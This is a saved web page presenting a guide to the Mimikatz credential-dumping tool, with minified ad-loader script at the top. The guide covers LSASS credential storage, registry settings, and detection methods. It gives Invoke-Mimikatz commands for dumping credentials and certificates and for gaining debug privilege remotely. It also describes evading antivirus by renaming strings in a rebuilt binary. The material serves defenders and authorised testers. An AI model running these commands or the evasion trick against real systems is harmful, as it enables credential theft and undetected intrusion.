if(Eb(a,k)){var n=B(k,2),k=H(k);null!=n&&null!=k&&0<=n&&0<=k&&(!c[n]||H(J(c[n]))<k)&&(c[n]=g)}}k=0;d=Ea(e,a.a.document);for(n=0;n<c.length&&k<b;++n){var e=k,f=a,l=d[n],g=c[n],k=b-k,m=f.f().i(),q=0;if(l&&g){var l=Da(l).length,p=J(g);switch(B(p,6)){case 0:case 1:--l;break;case 2:l-=2}for(p=H(J(g))+1;p<l&&q<k;++p){var z=g.o(),ea=J(z);C(ea,5,p);m.push(z);q++}}q&&f.f().ea(m);k=e+q}}},S=function(a,b){for(var c=0;c<a.G.length;++c)if(a.G[c]==b)return;a.G.push(b)},Gb=function(a,b){for(var c=0;c<a.u.length;++c)if(a.u[c]==
b)return;a.u.push(b)},Hb=function(a,b,c){var d=Za(a.a.document,b);if(d){var e=B(b,3),f;if(f=J(b))f=J(b),f=void 0!==B(f,2);if(!f||!eb(a.a,e,d))if(2!=e||c||Ya(d))if(c=1==e||2==e?d:d.parentNode,!(c&&0>=c.offsetWidth)||Fa(c))a:if(null==a.$||a.$.ua(a.a,b))if(B(b,7))Gb(a,8);else{b:if(B(b,5))c=B(b,5);else{if(c=T(a).f())if(c=B(c,3),a.Z<c.length){c=c[a.Z++];break b}S(a,4);c=null}if(null!=c){C(b,7,!0);e=[];(f=a.P())&&e.push(f);f=T(a).ha;for(var g=0;g<f.length;++g)e.push(f[g]);r(B(b,9))&&e.push("pso-lv-"+B(b,
9));var k=a.a.document;f=a.v();var g=c,n=B(b,6),l=D(b,I,2),m,q,p;l&&(m=B(l,1),q=B(l,2),p=!!B(l,3));var l=k.createElement("div"),z=l.style;z.textAlign="center";z.width="100%";z.height="auto";z.clear=p?"both":"none";p=k.createElement("ins");k=p.style;k.display="block";k.margin="auto";k.backgroundColor="transparent";m&&(k.marginTop=m);q&&(k.marginBottom=q);l.appendChild(p);l.className="googlepublisherpluginad";p.className="adsbygoogle";p.setAttribute("data-ad-client",f);g&&p.setAttribute("data-ad-slot",
g);p.setAttribute("data-ad-format",gb(n));e.length&&p.setAttribute("data-ad-channel",e.join("+"));p.setAttribute("data-tag-origin","pso");Xa(B(b,3),d,l);try{fb(a.a).push({})}catch(ea){B(b,5)!=c&&a.Z--;C(b,7,!1);Gb(a,6);l.parentNode&&l.parentNode.removeChild(l);break a}a.l.push(l)}}}},Ib=function(a,b){for(var c=Number.POSITIVE_INFINITY,d=0;d<a.l.length;++d)var e=a.l[d].getBoundingClientRect().top,f=a.l[d].getBoundingClientRect().bottom,c=Math.min(c,b<e?e-b:f<b?b-f:0);return c},T=function(a){a=P(a.a).ps||
null;if(!a)throw Error("No placementState");return a},Jb=function(a,b){var c=T(a).m;if(!c||!c.v())return S(a,5),!1;c=E(c,M,3)[0];return c?B(c,3).length<b?(S(a,4),S(a,5),!1):!0:(S(a,5),!1)};R.prototype.v=function(){return T(this).m.v()||""};R.prototype.P=function(){return T(this).m.P()||void 0};R.prototype.C=function(){return T(this).m.C()||new K};R.prototype.f=function(){var a=T(this).f();if(!a)throw Error("No mConfig");return a};var Kb=function(a){a=a.f();a=B(a,6);return null!=a&&0<a};var U=function(a){R.call(this,a)};t(U,R);U.prototype.apply=function(a){var b;(b=T(this).m)&&b.v()&&b.C()?b=!0:(S(this,5),b=!1);if(b){b=this.C().i();for(var c=0;c<b.length;c++){var d=b[c];B(d,7)||Hb(this,d,a)}}};U.prototype.A=function(){return(0==this.C().i().length||0<this.l.length)&&0==this.G.length};var Lb=function(a){R.call(this,a);if(Jb(this,0)){a=this.C().i();for(var b=this.f().i(),c=0;c<a.length;c++){var d=a[c],e;a:{e=d;var f=b;if(e&&J(e))for(var g=0;g<f.length;g++){var k=f[g];if(B(e,3)==B(k,3)&&Ha(J(e),J(k))){e=k;break a}}e=null}e&&D(e,I,2)&&(e=D(e,I,2),d.b||(d.b={}),f=e?e.g:e,d.b[2]=e,C(d,2,f))}}};t(Lb,U);var V=function(a){R.call(this,a)};t(V,R);V.prototype.apply=function(){};V.prototype.A=function(){return Kb(this)?Cb(new Ab(this.a)):!0};var Mb=function(a){R.call(this,a);this.D=null};t(Mb,R);
Mb.prototype.apply=function(a){if(a&&Jb(this,2)){Fb(this);a=Ta(this.a).clientHeight||640;null==this.D&&(this.D=new Ab(this.a));var b=this.D.ba.length;if(!(5<=b)){var b=Math.min(2,5-b),c=this.f().i();hb(c,this.a);for(var d=0;d<c.length&&this.l.length<b;++d){var e=c[d];if(ab(this.a,e)){var f=$a(this.a,e,!0);if(void 0!==f){var g;a:{g=this.D;for(var k=f,n=a,l=0;l<g.N.length;l++){var m=vb(g.N[l]);if(Math.abs(m.top-k)<n||Math.abs(m.bottom-k)<n){g=!0;break a}}g=!1}g||Ib(this,f)<a||Hb(this,e,!0)}}}0==this.l.length&&
Gb(this,1)}}};Mb.prototype.A=function(){return Kb(this)?Cb(this.D):!0};var Nb=function(a){R.call(this,a);this.W=!1};t(Nb,V);
Nb.prototype.apply=function(a){if(a&&!this.W){var b;a:{var c=this.a.document;b=c.body;if(a&&b){a=this.v();var d=c.createElement("div");d.className="googlepublisherpluginad";d.style.display="block";c=c.createElement("ins");c.className="adsbygoogle";c.setAttribute("data-ad-client",a);c.setAttribute("data-reactive-ad-format","1");c.setAttribute("data-tag-origin","pso");c.style.display="none";d.appendChild(c);Xa(2,b,d);try{fb(this.a).push({})}catch(e){Gb(this,6);d.parentNode&&d.parentNode.removeChild(d);
b=5;break a}this.l.push(d);b=0}else b=4}this.W=0==b}};Nb.prototype.A=function(){return this.W&&V.prototype.A.call(this)};var Ob=function(a){R.call(this,a);a=Ta(a).clientHeight;this.ka=.1*a;this.na=.75*a};t(Ob,R);
Ob.prototype.apply=function(a){if(!Jb(this,3))return!1;Fb(this);var b=this.f().i();hb(b,this.a);var c;c=this.ka;var d;d=document;d=d.querySelectorAll?d.querySelectorAll("header,#header,#masthead,.header,.site-header"):[];for(var e=d.length,f=0<e?d[0]:null,g=1;g<e;g++)d[g].getBoundingClientRect().top<f.getBoundingClientRect().top&&(f=d[g]);(d=f)&&(d=d.getBoundingClientRect())&&d.top!=d.bottom&&d.left!=d.right&&(c=Math.min(c,bb(document,d.bottom)));for(d=0;d<b.length&&3>this.l.length;d++){e=b[d];var f=
c,g=this.a.document,k=$a(this.a,e,!1);!r(k)||bb(g,k)<f?f=!1:(f=Ib(this,k),f=this.na<f);f&&(f=ab(this.a,e),g=B(e,6)||0,f&&0==g&&C(e,6,3),!f&&a||Hb(this,e,a))}return this.A()};Ob.prototype.A=function(){return 3==this.l.length};var W={};W[16]=U;W[17]=U;W[19]=V;W[29]=Mb;W[33]=V;W[30]=Nb;W[28]=Ob;W[32]=Lb;W[1]=U;W[8]=V;W[11]=U;var Pb=[19,29,33,30,16,32,17],Qb=[16,19,33,30,17,1,6,8,11];var Rb=function(a){return 0>a||99<a?null:10>a?"0"+a:""+a};var Sb=function(){this.I=this.J=this.Y=null};var Tb=function(a,b,c,d,e,f){var g=P(window).ss||null,k=P(window).ps||null,n,l=window;n=P(l).ls=P(l).ls||new ob;var m;k&&(m=k.m);var l=a?"pso_success":"pso_failure",q;m&&(q=a?B(m,10):B(m,7));null!=q||(q=.01);a={};var p;a:{p=(new Wa).document.getElementsByTagName("script");for(var z=0;z<p.length;++z)if(p[z].hasAttribute("data-pso-version")){p=p[z].getAttribute("data-pso-version");break a}p=null}a.sv=p;a.wpc=f||m&&m.v();a.su=m&&B(m,14);k&&m&&(a.tn=m.P(),f=k.f(),a.ev=f&&B(f,5));g&&(a.s=g.J,a.st=g.Y);
a.c=b;a.w=0<window.innerWidth?window.innerWidth:null;a.h=0<window.innerHeight?window.innerHeight:null;a.err=c.join();for(b=0;b<d.length;b++)a:{c=d[b];for(g=0;g<n.u.length;g++)if(n.u[g]==c)break a;n.u.push(c)}a.warn=n.u.join();if(e){a.excp_n=e.name;a.excp_m=e.message&&e.message.substring(0,512);if(d=e.stack){e=e.stack;try{-1==e.indexOf("")&&(e="\n"+e);for(var ea;e!=ea;)ea=e,e=e.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/,"$1");d=e.replace(/\n */g,"\n")}catch(Ac){d=""}}a.excp_s=d}0<q&&Oa(l,a,
"jserror"!=l,q)};var Ub=function(a){var b=X;a:if(r(a)){for(var c=0;c<Pb.length;++c)if(a==Pb[c]){a=!1;break a}a=!0}else a=!1;a&&(b=b.google_ad_modifications=b.google_ad_modifications||{},b.remove_ads_by_default=!0,b.ad_whitelist=[{ad_tag_origin:"pso"}],b.ad_blacklist=[],b.space_collapsing="slot")},Zb=function(){var a=X,b=Vb,c=Wb,d=b.f();if(!d)return Xb(16);var e;a:{e=E(d,L,1);for(var f=0;f<e.length;++f){for(var g=!0,k=0;k<Qb.length;++k)B(e[f],4)==Qb[k]&&(g=!1);if(g){e=[];0==d.i().length&&e.push("PsoInvalidVariant");
0==B(d,3).length&&e.push("PsoNoAdSlotCodes");break a}}e=[]}if(0<e.length){a=e;for(c=0;c<a.length;++c)b.ha.push(a[c]);return Xb(16)}a:{e=E(d,L,1);f=c.T;if(r(f))for(g=0;g<e.length;g++)if(k=e[g],W[B(k,4)])for(var n=E(k,xa,2),l=0;l<n.length;l++){var m=n[l],q=B(m,1),m=B(m,2);if(r(q)&&r(m)&&f>=q&&f<=m){e=k;break a}}e=null}if(!e){f=E(d,L,1);e={};for(g=0;g<f.length;g++)e[B(f[g],4)]=!0;f=null;e[19]||e[8]?f=19:e[16]||e[1]?f=16:0<d.i().length&&0<B(d,3).length&&(f=28);null!=f?(e=new L,C(e,6,3),C(e,4,f)):e=null}if(!e)return Xb(16);
2==B(e,6)&&((f=e.ca())&&jb(a,f),f=B(e,1),null!=f&&Ra(a,[""+f]));f=!0;g=c.O();if(g=B(g,2))g=Date.now?Date.now():+new Date,k=c.O(),k=B(k,2),g=g<k;g||(jb(a,"pso-ama-exd"),f=!1);B(b.m,11)&&(jb(a,"pso-ama-stl-tmp"),f=!1);f&&jb(a,"pso-ama-elig");if(f&&(2==B(e,6)||1==B(e,6))&&(f=e,d=E(d,L,1),null!==c.T)){c={};b=[];for(g=0;g<d.length;g++)k=Yb(d[g]),null==k||c[k]||(c[k]=!0,b.push(k));d=Yb(f);if(null!=d){c=[];d=Rb(d);f=!1;if(d)for(g=0;g<b.length;g++)k=Rb(b[g]),d==k&&(f=!0),k&&c.push("950"+d+k);f||(c=[]);Ra(a,
c)}}a=new Sb;a.Y=B(e,5);a.J=B(e,4);return a},Xb=function(a){var b=new Sb;b.J=a;return b},Yb=function(a){var b;switch(B(a,6)){case 1:b=B(a,4);break;case 2:b=B(a,7)}return null!=b?b:null};var $b=null,ac=!1,dc=function(a){var b=bc,c=cc;b.addEventListener?(a&&b.addEventListener("DOMContentLoaded",a,!1),c&&b.addEventListener("load",c,!1)):b.attachEvent&&c&&b.attachEvent("onload",c)},fc=function(){var a=window;r($b)&&a.clearInterval&&(a.clearInterval($b),$b=null);ac||ec(!1);ec(!0)},cc=function(){try{fc();var a=P(window).ss||null;if(a&&a.I){var b=a.I,c=b.A(),d=b.G,e=b.u,f=b.U,g=b.l.length;c||0!=g||d.push(6);c&&0==d.length&&null===f?Tb(!0,g,[],e,null):Tb(!1,g,d,e,f)}else Tb(!1,0,[2],[],
null,void 0)}catch(k){Tb(!1,null,[1],[],k)}P(window).loaded=!0},ec=function(a){a||(ac=!0);var b=P(window).ss||null;if(b&&b.I){b=b.I;try{b.apply(a)}catch(c){S(b,1),null===b.U&&(b.U=c)}}};try{var X=window,gc,hc=P(X).config;gc=hc?new N(hc):null;if(!gc)throw Error("No config");var Vb=new ib(gc),ic=Vb;P(X).ps=ic;var Y,Wb;if(v("iPad")||v("Android")&&!v("Mobile")||v("Silk")||!(v("iPod")||v("iPhone")||v("Android")||v("IEMobile")))Y=Xb(16);else{var jc,kc=/^#([^=]*)=(\d+)$/.exec(X.location.hash);if((jc=kc&&3==kc.length&&"pso_strategy"==kc[1]?+kc[2]:null)&&W[jc])Y=Xb(jc),Ub(jc);else{var lc=X,mc=Vb.m.O(),Z;try{var nc=parseInt(lc.localStorage.getItem("PSO_EXP0"),10);Z=isNaN(nc)?null:nc}catch(a){Z=
null}if(null==Z){Z=Math.floor(1024*Math.random());try{lc.localStorage.setItem("PSO_EXP0",Z.toString())}catch(a){}}Wb=new Sa(Z,0,mc);Y=Zb()}1==Y.Y&&Ub(Y.J)}if(!Y)throw Error("No strategyState created!");var oc=Y;P(X).ss=oc;var pc=X,qc=Y,rc=qc.J;if(r(rc)){var sc=W[rc];rc&&sc&&(qc.I=new sc(pc))}if(Wb){var tc=X,lb=Wb.T,kb=X.location.hostname,uc=[],vc=nb(["17415655","17415656"],1,mb("unif1"));null===vc||uc.push(vc);var wc=nb(["17415657","17415658"],10,mb("unif2"));null===wc||uc.push(wc);var xc=nb(["17415659",
"17415660"],100,mb("unif3"));null===xc||uc.push(""+xc);0<uc.length&&Ra(tc,uc)}var bc=X;switch(bc.document.readyState){case "complete":cc();break;case "interactive":fc();dc();break;default:var yc=ec,zc=fb(bc);zc.loaded||(zc.onload=yc);$b=bc.setInterval(ec,10);dc(fc)}}catch(a){Tb(!1,null,[],[],a)};})();
</script></head>
<body class="page page-id-1821 page-template-default two_col_left two-columns">

<div class="bg-gradient">


<div id="container" class="container_16">
    
            <div id="top-bar">
                				<div id="profiles" class="clearfix gutter-left">
                                <a href="https://adsecurity.org/?feed=rss2" title="Subscribe to Tech, News, and Other Ideations&#039;s RSS feed" id="social-id-1" class="mysocial social-rss">
            	<img src="https://adsecurity.org/wp-content/themes/graphene/images/social/rss.png" alt="RSS" title="Subscribe to Tech, News, and Other Ideations&#039;s RSS feed" />
            </a>
    	                </div>
                                        <div id="top_search" class="grid_4">
                    <form id="searchform" class="searchform" method="get" action="https://adsecurity.org">
    <p class="clearfix default_searchform">
        <input type="text" name="s" 
        	onblur="if (this.value == '') {this.value = 'Search';}" 
            onfocus="if (this.value == 'Search') {this.value = '';}" 
            value="Search" />
        <button type="submit"><span>Search</span></button>
    </p>
    </form>                                    </div>
                        
                        
        </div>
    
        <div id="header">
    	
        <img src="https://adsecurity.org/wp-content/themes/graphene/images/headers/fluid.jpg" alt="" width="1400" height="198" class="header-img" />        	       
        		
        			<h2 class="header_title push_1 grid_15">				<a href="https://adsecurity.org" title="Go back to the front page">					Active Directory Security				</a>			</h2>			
            <h3 class="header_desc push_1 grid_15">				Active Directory &amp; Enterprise Security, Attack Methods &amp; Effective Defenses, PowerShell, Tech Notes, &amp; Geek Trivia&#8230;			</h3>                
		    </div>
    <div id="nav">
                <div id="header-menu-wrap" class="clearfix">
				<ul id="header-menu" class="menu clearfix default-menu">
				<li >
			<a href="https://adsecurity.org">
				<strong>				Home				</strong>							</a>
		</li>
				<li class="page_item page-item-8"><a href="https://adsecurity.org/?page_id=8"><strong>About</strong></a></li>
<li class="page_item page-item-41"><a href="https://adsecurity.org/?page_id=41"><strong>AD Reading Library</strong></a></li>
<li class="page_item page-item-293"><a href="https://adsecurity.org/?page_id=293"><strong>Contact</strong></a></li>
<li class="page_item page-item-1821 current_page_item current-menu-item"><a href="https://adsecurity.org/?page_id=1821"><strong>Mimikatz</strong></a></li>
<li class="page_item page-item-1352"><a href="https://adsecurity.org/?page_id=1352"><strong>Presentations</strong></a></li>
<li class="page_item page-item-195"><a href="https://adsecurity.org/?page_id=195"><strong>Schema Versions</strong></a></li>
<li class="page_item page-item-399"><a href="https://adsecurity.org/?page_id=399"><strong>Security Resources</strong></a></li>
<li class="page_item page-item-183"><a href="https://adsecurity.org/?page_id=183"><strong>SPNs</strong></a></li>
<li class="page_item page-item-2532"><a href="https://adsecurity.org/?page_id=2532"><strong>Top Posts</strong></a></li>
	</ul>
	            
            <div class="clear"></div>
            
			            
                    
        </div>
		
                
        <div class="menu-bottom-shadow">&nbsp;</div>


        
    </div>

    
    <div id="content" class="clearfix hfeed">
                
                
        <div id="content-main" class="clearfix grid_11">
        
	
                
<div id="post-1821" class="clearfix post post-1821 page type-page status-publish hentry nodate">
	
		
	<div class="entry clearfix">                
		
        		
		        
		        <h1 class="post-title entry-title">
			Mimikatz			        </h1>
		
				<div class="post-meta clearfix">
			
						            
            <span class="updated">
            	<span class="value-title" title="2015-09-20T09:00" />
            </span>
														
					</div>
		
				<div class="entry-content clearfix">
							
			                        
                        <h1><span style="text-decoration: underline;"><strong>Unofficial Guide to Mimikatz &amp; Command Reference</strong></span></h1>
<h5>Mimikatz Command Reference Version: Mimikatz 2.0 alpha 20151113 (oe.eo) edition [11/13/2015]<br />
<em>Page last updated: 1/05/2016</em></h5>
<h3><span style="text-decoration: underline;"><strong>Introduction:</strong></span></h3>
<p>It seems like many people on both sides of the fence, Red &amp; Blue, aren&#8217;t familiar with most of Mimikatz&#8217;s capabilities, so I put together this information on all the available commands I could find. I plan to update as I can with additional content about the most useful commands. This way both Red &amp; Blue teams better understand the full capability and are better able to secure the enterprises they are hired to protect.</p>
<p>I developed this reference after speaking with a lot of people, hired to both defend, and attack, networks and I learned that outside of a couple of the top 3 used Mimikatz commands, not many knew about the full capability of Mimikatz. This page details as best as possible what each command is, how it works, the rights required to run it, the parameters (required &amp; optional), as well as screenshots and additional context (where possible). There are several I haven&#8217;t delved fully into, but expect to in the near future. While I will continue to post articles to ADSecurity.org about different aspects of Mimikatz usage, I plan to keep this as updated and as comprehensive as possible.</p>
<p><em>This information is provided to help organizations better understand Mimikatz capability and is not to be used for unlawful activity. Do NOT use Mimikatz on computers you don&#8217;t own or have been allowed/approved to. In other words, don&#8217;t pen-test/red-team systems with Mimikatz without a &#8220;get out of jail free card&#8221;.</em></p>
<p>This page and all content contained within is not to be reproduced in whole or part without <a href="https://adsecurity.org/?page_id=293">express written consent by this page&#8217;s author</a>.<br />
I did not write Mimikatz and therefore have no special insight. All of the information on this page is derived from using Mimikatz, reading the source code, conversations with Benjamin, his blog &amp; GitHub pages, and my own work/research.<br />
Any errors on this page are my own only. <a href="https://adsecurity.org/?page_id=293">Send comments/kudus here.</a></p>
<p>Many thanks to Benjamin Delpy for writing and continuously updating Mimikatz. His work has greatly improved the security of Windows, especially <a href="https://adsecurity.org/?p=1535">Windows 10</a>.</p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Mimikatz Overview:</strong></span></h3>
<p>Mimikatz is one of the best tools to gather credential data from Windows systems. In fact I consider Mimikatz to be the “Swiss army knife” (or multi-tool) of Windows credentials – that one tool that can do everything. Since the author of Mimikatz, Benjamin Delpy, is French most of the resources describing Mimikatz usage is in French, at least on <a href="http://blog.gentilkiwi.com/">his blog</a>. The <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz GitHub repository</a> is in English and includes useful information on command usage.</p>
<p>Mimikatz is a Windows x32/x64 program coded in C by Benjamin Delpy (@gentilkiwi) in 2007 to learn more about Windows credentials (and as a Proof of Concept). There are two optional components that provide additional features, <em>mimidrv</em> (driver to interact with the Windows kernal) and <em>mimilib</em> (AppLocker bypass, Auth package/SSP, password filter, and sekurlsa for WinDBG). Mimikatz requires administrator or SYSTEM and often debug rights in order to perform certain actions and interact with the LSASS process (depending on the action requested). The Mimikatz.exe contains, or at least should contain, all capability noted there.</p>
<p>Mimikatz capability can be leveraged by <a href="https://github.com/gentilkiwi/mimikatz">compiling and running your own version</a>, running the <a href="https://github.com/gentilkiwi/mimikatz/releases">Mimikatz executable</a>, leveraging the <a href="https://www.offensive-security.com/metasploit-unleashed/mimikatz/">MetaSploit script</a>, the <a href="https://github.com/PowerShellMafia/PowerSploit">official Invoke-Mimikatz PowerShell version</a>, or one of the dozen of Mimikatz PowerShell variants (I happen to be partial to <a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">PowerShell Empire</a>, because Empire is awesome!).</p>
<p>The Mimikatz source code and release binaries are available on GitHub and is licensed under Creative Commons with the following detail:<br />
<em>You are free to:</em><br />
<em> *  Share — copy and redistribute the material in any medium or format</em><br />
<em> *  Adapt — remix, transform, and build upon the material</em><br />
<em> *  for any purpose, even commercially.</em><br />
<em> The licensor cannot revoke these freedoms as long as you follow the license terms.</em><br />
<em> Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made. You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use.</em><br />
<em> No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits.</em></p>
<h4><strong><span style="text-decoration: underline;">Mimikatz Author(s):</span></strong></h4>
<ul>
<li>Benjamin DELPY <code>gentilkiwi</code>, you can contact him on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )</li>
<li>DCSync function in <code>lsadump</code> module was co-written with Vincent LE TOUX, you contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( <a href="http://www.mysmartlogon.com">http://www.mysmartlogon.com</a> )</li>
</ul>
<h4><strong><span style="text-decoration: underline;">&#8220;Official&#8221; Mimikatz Links:</span></strong></h4>
<p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz GitHub Location</a> (Source Code)</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/releases">Mimikatz Releases</a> (includes binaries)</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki">Mimikatz GitHub Wiki</a> (Documentation, some of which is reproduced here)</p>
<p><a href="http://blog.gentilkiwi.com/mimikatz">GentilKiwi Blog</a> (much of it is in French, use Chrome/other for translation)</p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Mimikatz &amp; Credentials:</strong></span></h3>
<p>After a user logs on, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service, <a href="http://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">LSASS, </a>process in memory. This is meant to facilitate single sign-on (SSO) ensuring a user isn’t prompted each time resource access is requested. The credential data may include NTLM password hashes, LM password hashes (if the password is &lt;15 characters), and even clear-text passwords (to support WDigest and SSP authentication among others. While you can <a href="http://support.microsoft.com/kb/299656">prevent a Windows computer from creating the LM hash</a> in the local computer SAM database (and the AD database),  this doesn’t prevent the system from generating the LM hash in memory. <a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx">By default, Windows Server 2008 and Windows Vista no longer generate LM hashes</a> for users unless explicitly enabled. Starting with Windows 8.1 and Windows Server 2012 R2, the LM hash and &#8220;clear-text&#8221; password are no longer in memory. <a href="https://adsecurity.org/?p=559">This functionality was also &#8220;back-ported&#8221; to earlier versions of Windows (Windows 7/8/2008R2/2012) in kb2871997</a>, though in order to prevent the &#8220;clear-text&#8221; password from being placed in LSASS, the following registry key needs to be set to &#8220;0&#8221; (Digest Disabled):</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" rel="attachment wp-att-2344"><img class="alignnone wp-image-2344" src="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" alt="WDIGEST-RegistryKey-UseLogonCredential-1" width="358" height="175" srcset="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1-300x147.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1-768x376.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg 959w" sizes="(max-width: 358px) 100vw, 358px" /></a></p>
<p>This registry key is worth monitoring in your environment since an attacker may wish to set it to 1 to enable Digest password support which forces &#8220;clear-text&#8221; passwords to be placed in LSASS on any version of Windows from Windows 7/2008R2 up to Windows 10/2012R2. Windows 8.1/2012 R2 and newer do not have a “UseLogonCredential” DWORD value, so it would have to be created. The existence of this key on these systems may indicate a problem.</p>
<p>Note that running code directly on a target system is rarely desirable for an attacker, so Mimikatz is continuously updated with new capability to be run remotely. This include running Mimikatz remotely against a remote system to dump credentials, using Invoke-Mimikatz remotely with PowerShell Remoting, and <a href="#DCSync">DCSync</a>, the latest feature to grab password data for any Active Directory account in the domain remotely against a DC without any Mimikatz code being run on the DC (<a href="https://adsecurity.org/?p=1729">it uses Microsoft&#8217;s Domain Controller official replication APIs, once the correct rights are attained</a>).</p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Available Credentials by OS:</strong></span></h3>
<p>Benjamin Delpy posted an<a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254%212074&amp;cid=a352ebc5934f0254&amp;app=Excel"> Excel chart on OneDrive</a> (shown below) that shows what type of credential data is available in memory (LSASS), including on Windows 8.1 and Windows 2012 R2 which have enhanced protection mechanisms reducing the amount and type of credentials kept in memory.<br />
<a href="http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png"><img class="alignnone wp-image-583" src="http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart-300x129.png" alt="Delpy-CredentialDataChart" width="339" height="146" srcset="https://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart-300x129.png 300w, https://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart-1024x441.png 1024w" sizes="(max-width: 339px) 100vw, 339px" /></a><br />
<em>(Click image to embiggen)</em></p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>PowerShell &amp; Mimikatz:</strong></span></h3>
<p>The majority of Mimikatz functionality is available in <a href="https://github.com/mattifestation/PowerSploit">PowerSploit </a>(PowerShell Post-Exploitation Framework) through the “<a href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>” PowerShell script (written by <a href="https://twitter.com/JosephBialek">Joseph Bialek</a>) which “leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as dump credentials without ever writing the Mimikatz binary to disk.” Note that the PowerSploit framework is now hosted in the <a href="https://github.com/PowerShellMafia/PowerSploit">&#8220;PowerShellMafia&#8221; GitHub repository</a>.</p>
<p>What gives Invoke-Mimikatz its &#8220;magic&#8221; is the ability to reflectively load the Mimikatz DLL (embedded in the script) into memory. The Invoke-Mimikatz code can be downloaded from the Internet (or intranet server), and executed from memory without anything touching disk. Furthermore, if Invoke-Mimikatz is run with the appropriate rights and the target computer has PowerShell Remoting enabled, it can pull credentials from other systems, as well as execute the standard Mimikatz commands remotely, without files being dropped on the remote system.</p>
<p>Invoke-Mimikatz is not updated when Mimikatz is, though it can be (manually). One can swap out the DLL encoded elements (32bit &amp; 64bit versions) with newer ones. Will Schroeder (<a href="https://twitter.com/harmj0y">@HarmJ0y)</a> has i<a href="http://www.verisgroup.com/blog/2015/09/22/mimikatz-and-dcsync-and-extrasids-oh-my/">nformation on updating the Mimikatz DLLs in Invoke-Mimikatz</a> (it&#8217;s not a very complicated process). The <a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">PowerShell Empire version of Invoke-Mimikatz</a> is usually kept up to date.</p>
<ul>
<li>Use mimikatz to dump credentials out of LSASS:  <em>Invoke-Mimikatz -DumpCreds</em></li>
<li>Use mimikatz to export all private certificates (even if they are marked non-exportable): <em>Invoke-Mimikatz &#8211;</em>DumpCerts</li>
<li>Elevate privilege to have debug rights on remote computer: <em>Invoke-Mimikatz -Command &#8220;privilege::debug exit&#8221; -ComputerName &#8220;computer1&#8221;</em></li>
</ul>
<p>The Invoke-Mimikatz &#8220;Command&#8221; parameter enables Invoke-Mimikatz to run custom Mimikatz commands.</p>
<p><strong><em>Defenders should expect that any functionality included in Mimikatz is available in Invoke-Mimikatz.</em></strong></p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Detecting Mimikatz:</strong></span></h3>
<p>There are several ways to potentially detect Mimikatz use on a network, though none are guaranteed. Since Mimikatz&#8217;s source code is on <a href="https://github.com/gentilkiwi/mimikatz">GitHub</a>, anyone with Visual Studio can compile their own version. I built my own version of Mimikatz called &#8220;kitikatz&#8221; by replacing all instances of &#8220;mimikatz&#8221; with &#8220;kitikatz&#8221; and the detection rate at VirusTotal was not good (4/54). Windows Defender on my Windows 10 system detected it.  I then replaced &#8220;Benjamin Delpy&#8221; and &#8220;gentilkiwi&#8221; with the same words, just replacing the e&#8217;s with 3&#8217;s and the i&#8217;s with 1&#8217;s. The detection rate was <a href="https://www.virustotal.com/en/file/84b6cd8ccaa60a89c1375bec5044e6240d8a2db3f19fecd763749fa9a530470b/analysis/1449967355/">still poor (4/54)</a>. Windows Defender on my Windows 10 system did not detect it. So, your mileage will vary regarding detection.</p>
<ul>
<li>Benjamin Delpy publishes <a href="https://plusvic.github.io/yara/">YARA rules</a> for Mimikatz on the <a href="https://github.com/gentilkiwi/mimikatz">Mimkatz GitHub repository</a>.</li>
<li>Run AntiVirus software with the latest definition files. According to <a href="https://www.virustotal.com/en/">VirusTotal</a>, the <a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/">mimikatz.exe dated 11/11/2015</a> (32bit &amp; 64bit) is detected by <a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/">35/35 of the AV engines</a>. Renaming the file doesn&#8217;t change the scan results. Note that Benjamin has noted real-world results to be<a href="https://twitter.com/gentilkiwi/status/658344484615421954"> less successful</a>. However, AV will usually flag the known bad files. AntiVirus is part of foundational security &#8211; the first layer in &#8220;defense in depth&#8221;.</li>
